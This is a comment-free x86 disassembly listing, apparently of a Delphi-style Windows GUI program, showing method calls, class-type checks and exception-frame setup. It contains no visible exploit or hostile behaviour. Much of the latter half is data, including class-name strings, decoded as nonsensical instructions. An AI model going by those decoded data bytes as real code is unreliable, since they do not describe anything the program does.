mov eax [ esp ]
mov edx [ eax + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ esp ]
mov edx [ eax + 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax [ esp ]
mov edx [ eax + 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
inc esi
xor ebp ebp
inc ebp
dec esi
jne r-xdata
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0x28c ]
call sub_4a8150
mov ebx eax
mov eax [ esp ]
mov edx [ eax + 0x10 ]
mov eax ebx
call sub_4a7bcc
mov eax [ esp ]
mov ecx [ eax + 0x18 ]
xor edx edx
mov eax ebx
call sub_4a7d90
mov eax [ esp ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_4a7c80
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax [ esp ]
call sub_425180
mov edx eax
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0x29c ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
mov eax [ edi + 0x28 ]
mov eax [ eax + 0x50 ]
mov edx ebp
call sub_4246e8
mov ebx eax
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov eax [ esp ]
call sub_425180
mov edx eax
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0x28c ]
call sub_4a8fb8
mov eax [ edi + 0x28 ]
mov eax [ eax + 0x50 ]
mov edx ebp
call sub_4246e8
mov ebx eax
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
sub_46af60
push ebx
push esi
push edi
push ebp
push ecx
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_46a760
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
cmp [ eax + 0xa0 ] 0x0
je r-xdata
cmp [ eax + 0xb0 ] 0x0
jne r-xdata
mov eax [ eax + 0x50 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
inc ebp
mov [ esp ] 0x0
mov eax [ esi + 0x20 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax [ esi + 0x20 ]
mov edx [ r-xdata ]
call sub_4483ac
mov esi eax
mov eax ebx
call sub_425180
mov edx eax
mov eax [ esi + 0x2f4 ]
call sub_46a858
mov esi eax
mov edx [ ebx + 0x10 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx [ ebx + 0x18 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx [ ebx + 0x14 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
inc [ esp ]
dec ebp
jne r-xdata
mov eax ebx
call sub_425180
mov edx eax
mov eax [ esi + 0x20 ]
mov eax [ eax + 0x28c ]
call sub_4a81f0
mov esi eax
mov edx [ ebx + 0x10 ]
mov eax esi
call sub_4a7bcc
mov ecx [ ebx + 0x18 ]
xor edx edx
mov eax esi
call sub_4a7d90
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_4a7c80
mov eax [ edi + 0x28 ]
mov eax [ eax + 0x50 ]
mov edx [ esp ]
call sub_4246e8
mov esi eax
mov eax [ esi + 0x20 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
sub_46b07c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_46a8d8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x60 ]
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46a890
mov esi eax
mov [ ebx + 0xd0 ] esi
mov [ esi + 0x28 ] ebx
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_46b0dc
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
lea eax [ esi + 0xd0 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_451504
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_46b120
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov esi edx
mov edi eax
test esi esi
jl r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ edi + 0xd0 ]
call sub_4254d8
cmp esi eax
jl r-xdata
test bl bl
je r-xdata
mov bl 0x1
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax [ edi + 0xd0 ]
call sub_46a858
mov edx eax
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
cmp [ edi + 0xda ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx edi
mov eax [ edi + 0xdc ]
call [ edi + 0xd8 ]
sub_46b18c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0xd0 ]
call sub_46a858
mov edx [ eax + 0x10 ]
mov eax edi
call sub_449d2c
pop edi
pop esi
pop ebx
retn
sub_46b1c0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0xd0 ]
call sub_46a858
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x20 ]
pop edi
pop esi
pop ebx
retn
sub_46b1f8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x10 ]
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_46b224
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_42eb50
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x10 ]
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
cmp [ esi + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_46b2d8
sub_46b268
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov ebx [ esi + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
pop esi
pop ebx
retn
mov eax esi
call sub_46b2d8
mov eax [ esi + 0x10 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
sub_46b2d8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_46b41b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b422
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov ebx [ esi + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov ebx [ esi + 0x10 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4483ac
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x54 ]
dec eax
test eax eax
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
xor ebx ebx
inc eax
mov [ ebp - 0x10 ] eax
xor ebx ebx
inc ebx
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0xd0 ]
mov edx ebx
call sub_46a858
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xa8 ]
inc ebx
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xac ]
mov eax [ edi + 0xd0 ]
mov edx ebx
call sub_46a858
mov ecx eax
mov edx ebx
mov eax edi
call sub_46b120
test al al
je r-xdata
jmp r-xdata
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_4483ac
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax edi
call sub_46ac9c
test al al
je r-xdata
sub_46b430
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46b44f
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b456
retn
sub_46b45c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x20 ]
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4483ac
mov edx edi
mov ecx [ eax ]
call [ ecx + 0xe0 ]
sub_46b494
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46b4b9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b4c0
retn
sub_46b4d0
add [ esi ] eax
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
nop
nop
nop
cmp al 0xb5
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + esi * 4 + 0x46 ] al
add [ eax + eax ] bl
add [ eax ] al
mov esp 0x6c004337
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ edi ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ eax ] bl
inc ebp
dec ecx
outsb
jbe r-xdata
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ ebp + esi * 4 + 0x46 ] bp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0xb5
inc esi
add [ eax + eax ] bl
add [ eax ] al
mov esp 0x6c004337
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
inc esi
outsd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
jae r-xdata
popad
insd
nop
sub [ esi + 0xc010046 ] dh
push esp
inc esi
je r-xdata
jae r-xdata
outsb
jb r-xdata
push 0x65737261
je r-xdata
outsd
outsb
nop
nop
nop
aam 0xb5
inc esi
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
popad
je r-xdata
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
inc esp
mov dh 0x46
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add al dl
mov ch 0x46
add [ ecx ] cl
jo r-xdata
jae r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
je r-xdata
popa
jne r-xdata
push ebx
je r-xdata
push eax
outsb
dec esi
jo r-xdata
imul esp [ ebx + 0x73 ] 0x46b72c90
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
popad
jae r-xdata
push 0x5657469
jo r-xdata
inc esp
popad
jae r-xdata
or [ eax + 0x6d ] esi
inc ebx
insb
popad
jb r-xdata
add eax 0x6f4e6d70
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
mov dh 0x46
add [ eax + 0x46b6ac90 ] dl
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
je r-xdata
inc eax
push ebx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax - 0x4a ] al
inc esi
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
add [ eax ] al
add [ eax ] al
loopne r-xdata
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
add [ eax ] al
add ah ah
mov bh 0x46
add [ edi ] al
dec ebp
jb r-xdata
je r-xdata
inc edx
insb
add eax 0x6f4e6d70
dec esi
outsd
je r-xdata
jo r-xdata
dec esi
outsd
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
inc esp
outsd
insd
outsd
or esi [ eax + 0x73 ]
jo r-xdata
jo r-xdata
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
outsd
imul esp [ ebx + 0x73 ] 0xb6949090
inc esi
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
push esp
push eax
outsb
insb
add [ gs : eax ] eax
add [ eax ] al
add [ eax ] cl
add [ eax ] al
add [ eax + 0x70046b6 ] ch
jo r-xdata
outsd
push es
jo r-xdata
jb r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
pop es
jo r-xdata
or esp [ edx + 0x73 ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
mov eax 0xb8cc0046
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
pop es
jb r-xdata
insd
push edi
push es
jo r-xdata
jae r-xdata
popad
jae r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
jb r-xdata
jo r-xdata
dec ecx
outsb
jb r-xdata
inc ebx
outsd
jo r-xdata
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
add [ edi ] cl
add [ eax ] al
add [ edi ] al
jo r-xdata
inc esp
popad
jae r-xdata
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
add [ esi ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
inc eax
mov dh 0x46
popad
jb r-xdata
dec ebp
inc edx
add [ ecx ] al
add ch bh
add [ eax - 0x67ffbdb2 ] dl
jae r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ ebp + ecx * 2 + 0x4e900042 ] dl
inc edx
inc esp
inc esi
imul esp [ ebx + 0x61 ] 0x73620b6c
inc esi
add [ eax + eax ] bl
jpe r-xdata
add [ gs : eax ] eax
add [ eax ] al
outsb
pop es
jo r-xdata
add [ ebx ] al
outsb
push es
jo r-xdata
inc esp
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
je r-xdata
dec esi
outsd
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
inc esi
push 0x6c797453
push 0x90736369
push eax
outsb
dec esi
outsd
je r-xdata
nop
call 0x346fea0
arpl [ ebx - 0x70 ] si
dec ebp
jb r-xdata
insd
je r-xdata
dec esi
outsd
je r-xdata
insd
inc esi
jb r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0xb7e89090
inc esi
je r-xdata
insb
add [ eax ] ch
mov bh 0x46
sldt [ eax ]
je r-xdata
add eax 0x6f447370
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0x46b61890
add [ edx ] dl
or [ esi + eax * 2 + 0x6f ] edx
dec ecx
je r-xdata
jo r-xdata
popad
bound ebp [ ebp + 0x7 ]
dec esi
inc edx
add al al
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0xffff0001
nop
cwde
mov ecx 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
mov ecx 0xb9c80046
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x41ffb947 ] dh
mov ecx 0x2c0046
add [ eax ] al
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax - 0x48 ] si
inc esi
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
inc edx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
outsb
je r-xdata
dec ebp
jb r-xdata
insb
dec ebp
popad
jae r-xdata
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
mov eax 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
les edi [ eax - 0x4733ffba ]
mov eax 0x46b8
or eax 0x654d6d70
jb r-xdata
jo r-xdata
outsd
je r-xdata
insb
or esi [ gs : eax + 0x73 ]
inc ecx
insb
jns r-xdata
push ebp
jae r-xdata
insd
or esi [ gs : eax + 0x73 ]
outsd
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
popad
insb
dec esi
outsd
je r-xdata
or al 0x70
insd
jb r-xdata
nop
inc edi
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] cl
mov ecx 0x200046
add [ eax ] al
add [ eax ] eax
std
call [ esp + edx * 8 + 0x46 ]
add [ 0x6e6f4654 ] al
je r-xdata
aam 0x46
add [ eax + eax + 0x64 ] 0x20004481
mov ecx 0x5070046
push esp
inc esi
outsd
outsb
je r-xdata
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
enter 0x46b9 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov dh 0xb9
inc esi
add [ esi + 0x2c0046b9 ] bh
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + edi * 4 - 0x48 ] si
inc esi
add [ ebp + ebx + 0x42 ] dl
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ eax ] al
aam 0x1c
add ah cl
mov eax 0x1c0046
insb
dec esi
outsd
or dh [ gs : eax + 0x6d ]
nop
inc edi
jb r-xdata
jae r-xdata
dec ebp
popad
jo r-xdata
add [ eax - 0x3fffbdb2 ] bl
jo r-xdata
pushad
mov ecx 0xb8dc0046
inc esi
add [ eax ] cl
add [ eax ] cl
inc edi
jb r-xdata
add [ eax ] al
add [ eax - 0x48 ] ah
inc esi
add [ edx + eax * 4 + 0x44 ] ch
mov esi 0x2c0046b9
jo r-xdata
outsd
outsb
jo r-xdata
jb r-xdata
pop eax
call [ edi + ecx * 8 + 0x46 ]
add [ edi ] cl
push esp
inc edi
jb r-xdata
add [ eax ] eax
std
add [ eax ] al
imul esp [ ebx + 0x73 ] 0x46b8b890
add al [ eax ]
push es
dec eax
imul esp [ gs : edi + 0x68 ] 0x46b61474
jo r-xdata
mov eax 0x826c0046
inc esp
imul esp [ ebx + 0x73 ] 0x90900000
or al 0xb9
inc esi
add [ edi ] cl
cmovns eax [ ebx + 0x68 ]
popad
outsb
dec esi
outsd
je r-xdata
inc esi
add [ eax + eax ] ah
push r-xdata
and cl bl
inc esi
add [ ecx + ebx * 8 ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53040006 ] al
imul edi [ edx + 0x65 ] r-xdata
pop esp
fld [ esi ]
push 0x10046d9
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53050007 ] al
je r-xdata
add [ eax - 0x28 ] dh
inc esi
add ah al
fadd [ esi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add al 0x4e
popad
insd
insb
push esi
inc esp
add [ eax ] ch
fiadd [ esi ]
xor dl bl
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
or ecx [ edi + 0x72 ]
imul esp [ ebp + 0x6e ] 0x69746174
outsd
outsb
shl [ ebp - 0x2657ffba ] 0x1
inc esi
add [ eax + 0x10046d9 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x69500500
je r-xdata
adc al 0xb6
inc esi
imul esp [ ebx + 0x73 ] 0xb6240008
inc esi
add al ch
fld [ esi ]
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax ] ah
imul sp [ ebp + 0x72 ] 0x5760
inc esp
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
and al 0xdd
inc esi
add [ ebx * 8 + 0x10046 ] ch
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
imul esp [ ebx + 0x73 ] 0xb4cc0004
inc esi
add [ eax ] cl
fadd [ esi ]
adc ah bl
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
inc esp
mov ebx 0xb8dc0046
inc esi
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ eax ] al
pushad
mov eax 0x826c0046
inc esp
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ edx + ebx * 8 + 0x4e900046 ] dh
inc edx
add [ eax - 0x17ffbdb2 ] bl
fiadd [ esi ]
add al 0x54
push eax
outsb
nop
nop
nop
pop esp
mov ebx 0x4070046
push esp
push eax
outsb
insb
nop
inc esp
mov ebx 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
mov ebx 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
mov ebx 0x240046
add [ eax - 0x67ffbdb2 ] dl
dec esi
inc edx
add [ eax - 0x2c ] dh
jo r-xdata
add [ eax ] al
jae r-xdata
add eax [ eax ]
add eax 0x74646957
push 0xbc509090
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x44 ] ch
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi * 4 + 0x46 ] bl
add [ eax + eax ] bl
add [ eax ] al
pushad
mov eax 0x826c0046
inc esp
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax - 0x6fffb923 ] ch
dec esi
inc edx
add [ eax - 0x23ffbdb2 ] bl
fld [ esi ]
push es
push esp
inc edx
jb r-xdata
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al [ eax ]
add eax 0x6c797453
insb
push esi
inc esp
add [ ebx * 8 - 0x22d3ffba ] ah
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
mov bh 0x46
add [ eax ] bl
add [ eax ] al
add [ eax ] al
aam 0x1c
inc edx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax - 0x1f ] dh
inc esi
add [ eax - 0x67ffbdb2 ] dl
dec esi
inc edx
add al al
dec ebp
inc edx
add [ eax ] dh
0xea1c0046 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edi * 4 + 0x46 ] al
add [ eax ] al
add [ eax ] al
nop
push 0x70046bc
push es
push esp
inc edx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] bh
mov ebp 0x5c0046
jae r-xdata
inc esp
mov ebp 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
mov esp 0xb8dc0046
inc esi
add [ edx ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ eax ] al
add [ eax ] al
jo r-xdata
cmp [ ebp + 0x5c0046 ] bh
imul esp [ ebx + 0x73 ] 0xb4cc0002
inc esi
add [ edi + ebx * 8 ] dl
inc esi
add [ edi + ebx * 8 ] bl
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc [ eax ]
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
fild [ esi ]
sbb al 0xdf
mov bh 0x46
add [ eax - 0x20 ] dl
inc esi
add [ eax - 0x20 ] bl
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
add eax 0x6c797453
nop
nop
nop
and [ ebp + 0x46 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_46bb9f
fcomp st4
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] 0x0
add [ ecx ] al
add [ ecx * 2 - 0x579a9b91 ] al
mov dh 0x46
add ah ch
fadd [ esi ]
hlt
sub_46bd3a
inc ebx
popad
outsb
jbe r-xdata
jns r-xdata
jae r-xdata
add al 0x24
retn
outsd
les edi [ gs : ecx + 0xc0046 ]
add bh bh
add [ eax ] ah
